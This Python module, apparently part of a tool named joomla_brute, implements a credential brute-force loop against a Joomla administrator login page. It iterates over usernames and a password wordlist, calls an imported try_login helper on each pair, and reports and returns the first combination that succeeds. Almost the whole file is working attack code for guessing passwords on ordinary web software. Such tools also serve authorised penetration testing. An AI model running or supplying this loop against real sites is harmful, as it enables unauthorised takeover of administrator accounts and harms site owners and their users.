"""Brute-force loop over usernames and passwords."""

from __future__ import annotations

import logging
from pathlib import Path

import requests

from joomla_brute.auth import try_login
from joomla_brute.fileio import iter_nonempty_lines
from joomla_brute.reporter import print_result

LOG = logging.getLogger(__name__)


def run_bruteforce(
    session: requests.Session,
    admin_url: str,
    wordlist: Path,
    usernames: list[str],
    *,
    log_failures: bool,
    use_color: bool,
) -> tuple[bool, str | None, str | None]:
    """
    Returns (success, username, password) where success means credentials found.
    """
    for username in usernames:
        LOG.info("Trying user %r", username)
        for password in iter_nonempty_lines(wordlist):
            ok = try_login(session, admin_url, username, password)
            if ok:
                print_result(username, password, failed=False, use_color=use_color)
                return True, username, password
            if log_failures:
                print_result(username, password, failed=True, use_color=use_color)
    return False, None, None
